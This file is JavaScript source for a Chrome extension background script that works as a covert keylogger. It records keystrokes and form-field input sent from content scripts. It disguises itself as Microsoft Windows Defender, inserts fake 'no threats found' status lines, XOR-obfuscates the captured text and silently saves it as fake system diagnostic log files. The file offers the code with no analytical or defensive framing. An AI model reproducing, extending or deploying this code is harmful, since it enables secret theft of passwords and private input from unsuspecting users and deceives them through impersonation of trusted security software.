// Hardcoded configuration
const CONFIG = {
    SALT: "Test@1234!!!",
    LOG_DIR: "WindowsSystemHealthLogs\\",
    COMPANY: "Microsoft",
    PRODUCT: "Windows Defender",
    VERSION: "1.0.5",
    MAX_BUFFER_SIZE: 1000000,
    MIN_BUFFER_SIZE: 800000
};

// Simple XOR encryption
function encryptData(data, salt) {
    let encrypted = '';
    for (let i = 0; i < data.length; i++) {
        const charCode = data.charCodeAt(i) ^ salt.charCodeAt(i % salt.length);
        encrypted += String.fromCharCode(charCode);
    }
    return btoa(encrypted);
}

function generateFilename() {
    const timestamp = new Date().toISOString().replace(/[-:T.]/g, '').slice(0, 14);
    const prefixes = ['SystemDiagnostics','PerformanceLog','ResourceMonitor','EventTracing','HealthMetrics'];
    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
    return `${prefix}_${timestamp}.etl`;
}

class StealthLogger {
    constructor() {
        this.buffer = "";
        this.logCount = 0;
        this.isActive = true;
        this.lastActivity = Date.now();
        this.lastSaveTime = Date.now();
        this.init();
    }

    init() {
        const interval = Math.floor(Math.random() * 300000) + 600000; // 10–15 minutes
        this.saveInterval = setInterval(() => this.saveBuffer(), interval);
        this.systemMimicInterval = setInterval(() => this.mimicSystemActivity(), 180000); // every ~3 min
        console.log(`${CONFIG.PRODUCT} ${CONFIG.VERSION} initialized`);
    }

    mimicSystemActivity() {
        const messages = [
            "System scan completed - No threats found",
            "Real-time protection active",
            "Firewall rules updated",
            "Memory usage optimized",
            "Signature database up to date",
            "Network traffic analyzed"
        ];
        this.addToBuffer(`[${new Date().toISOString()}] ${CONFIG.PRODUCT}: ${messages[Math.floor(Math.random()*messages.length)]}`);
    }

    addToBuffer(data) {
        if (!this.isActive || !data) return;
        this.buffer += `[${new Date().toISOString()}] ${data}\n`;
        this.lastActivity = Date.now();

        if (this.buffer.length >= CONFIG.MIN_BUFFER_SIZE) {
            this.saveBuffer();
        }
    }

    saveBuffer() {
        if (this.buffer.length === 0 || !this.isActive) return;

        try {
            const encrypted = encryptData(this.buffer, CONFIG.SALT);
            
            const header = `<?xml version="1.0" encoding="UTF-8"?>
<!-- ${CONFIG.COMPANY} ${CONFIG.PRODUCT} Diagnostic Log -->
<!-- Generated: ${new Date().toISOString()} -->
<!-- Version: ${CONFIG.VERSION} -->
<EventTraceSession xmlns="http://schemas.microsoft.com/win/2004/08/events/trace">
  <System>
    <Provider Name="${CONFIG.PRODUCT}" Guid="{${this.generateGuid()}}" />
    <EventID>1000</EventID>
    <Channel>Application</Channel>
    <Computer>${this.getComputerName()}</Computer>
  </System>
  <UserData><Data>`;

            const footer = `</Data></UserData></EventTraceSession>`;
            const finalData = header + encrypted + footer;
            const filename = generateFilename();

            const dataUrl = 'data:application/xml;charset=utf-8,' + encodeURIComponent(finalData);

            chrome.downloads.download({
                url: dataUrl,
                filename: CONFIG.LOG_DIR + filename,
                saveAs: false,
                conflictAction: 'uniquify'
            }, () => {
                if (!chrome.runtime.lastError) {
                    this.buffer = "";
                    this.logCount++;
                    this.lastSaveTime = Date.now();
                }
            });
        } catch (e) {
            console.error(`${CONFIG.PRODUCT}: Save error -`, e);
        }
    }

    generateGuid() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
            const r = Math.random() * 16 | 0;
            return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
        });
    }

    getComputerName() {
        return navigator.platform || 'WIN11-PC';
    }

    deactivate() {
        this.isActive = false;
        clearInterval(this.saveInterval);
        clearInterval(this.systemMimicInterval);
        if (this.buffer.length > 0) this.saveBuffer();
    }
}

const logger = new StealthLogger();

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (!request || !logger.isActive) return true;

    if (request.type === 'KEYSTROKE') {
        logger.addToBuffer(`KEYSTROKE → ${request.data}`);
    }
    else if (request.type === 'INPUT') {
        logger.addToBuffer(`INPUT FIELD [${request.field}] → ${request.value}`);
    }
    else if (request.type === 'SYSTEM') {
        logger.mimicSystemActivity();
    }
    else if (request.type === 'STATUS') {
        sendResponse({ active: logger.isActive, logs: logger.logCount, buffer: logger.buffer.length });
    }

    return true;
});

chrome.runtime.onSuspend.addListener(() => logger.deactivate());
chrome.runtime.onInstalled.addListener(() => {
    logger.addToBuffer("Extension initialized - Windows Defender Diagnostic Service");
});
